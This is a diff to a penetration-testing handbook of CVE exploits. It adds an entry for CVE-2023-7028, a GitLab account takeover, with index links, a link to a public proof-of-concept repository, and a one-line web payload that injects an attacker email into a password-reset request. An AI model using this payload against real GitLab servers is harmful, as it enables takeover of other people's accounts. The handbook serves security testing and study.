@@ -31,6 +31,7 @@
 - [CVE-2023-38146: ThemeBleed RCE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-38146-ThemeBleed-RCE)
 - [CVE-2023-46604: Apache ActiveMQ OpenWire Transport RCE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-46604-Apache-ActiveMQ-OpenWire-Transport-RCE)
 - [CVE-2023-4911: Looney Tunables LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-4911-Looney-Tunables-LPE)
+- [CVE-2023-7028: GitLab Account Takeover](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-7028-GitLab-Account-Takeover)
 - [GodPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#GodPotato-LPE)
 - [Juicy Potato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Juicy-Potato-LPE)
 - [JuicyPotatoNG LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#JuicyPotatoNG-LPE)
@@ -144,6 +145,7 @@
 | CVE-2023-46604 | Apache ActiveMQ OpenWire Transport RCE | https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ |
 | CVE-2023-4911 | Looney Tunables LPE | https://github.com/RickdeJager/CVE-2023-4911 |
 | CVE-2023-51467, CVE-2023-49070 | Apache OFBiz Authentication Bypass | https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass |
+| CVE-2023-7028 | GitLab Account Takeover | https://github.com/V1lu0/CVE-2023-7028 |
 | n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
 | n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
 | n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
@@ -1205,6 +1207,14 @@ $ python3 gen_libc.py
 ```c
 $ gcc -o exp exp.c
 $ ./exp
+```
+
+## CVE-2023-7028: GitLab Account Takeover
+
+> https://github.com/V1lu0/CVE-2023-7028
+
+```c
+user[email][]=valid@email.com&user[email][]=attacker@email.com
 ```
 
 ## GodPotato LPE
